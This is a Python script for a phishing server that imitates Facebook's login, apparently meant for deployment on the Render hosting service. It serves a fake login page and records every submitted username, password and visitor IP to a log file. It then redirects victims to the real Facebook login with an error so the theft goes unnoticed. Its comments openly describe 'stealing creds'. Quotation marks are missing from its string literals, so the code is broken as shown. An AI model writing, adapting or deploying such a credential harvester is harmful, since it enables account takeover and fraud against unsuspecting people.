import http.server
import socketserver
import urllib.parse
import ssl
import logging
import os

# --- Render-Friendly Config ---
# Grab the port from Render's environment, default to 8080 for local Kali testing
PORT = int(os.environ.get(PORT, 8080)) 
LOG_FILE = creds.log
HTML_FILE = facebook_login.html

# SSL is handled by Render automatically (Terminate at Load Balancer), 
# so we usually keep USE_SSL as False for the internal Python code.
USE_SSL = False 
CERT_FILE = server.crt
KEY_FILE = server.key

logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format=%(asctime)s - %(message)s)

class PhishHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == / or self.path == f/{HTML_FILE}:
            self.send_response(200)
            self.send_header(Content-type, text/html)
            self.end_headers()
            if os.path.exists(HTML_FILE):
                with open(HTML_FILE, rb) as f:
                    self.wfile.write(f.read())
            else:
                self.wfile.write(bError: Login page not found on server.)
        else:
            # Serve other files (css/images) if they exist
            super().do_GET()

    def do_POST(self):
        content_length = int(self.headers[Content-Length])
        post_data = self.rfile.read(content_length).decode()
        params = urllib.parse.parse_qs(post_data)
        
        username = params.get(username, [])[0]
        password = params.get(password, [])[0]
        
        log_msg = fCaught: user={username}, pass={password}, IP={self.client_address[0]}
        logging.info(log_msg)
        print(log_msg)
        
        # Redirect back to the real Facebook after stealing creds
        self.send_response(302)
        self.send_header(Location, https://www.facebook.com/login/?error=invalid)
        self.end_headers()

    def log_message(self, format, *args):
        # Suppress standard logging to keep the console clean
        pass

def run_server():
    # Use 0.0.0.0 to allow external traffic from Render's load balancer
    # Allow address reuse to prevent Port already in use errors during redeploys
    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer((0.0.0.0, PORT), PhishHandler) as httpd:
        
        if USE_SSL and os.path.exists(CERT_FILE):
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            context.load_cert_chain(certfile=CERT_FILE, keyfile=KEY_FILE)
            httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
            proto = HTTPS
        else:
            proto = HTTP
        
        print(f[+] {proto} Phishing Server live on port {PORT})
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print(n[-] Shutting down...)
            httpd.server_close()

if __name__ == __main__:
    run_server()
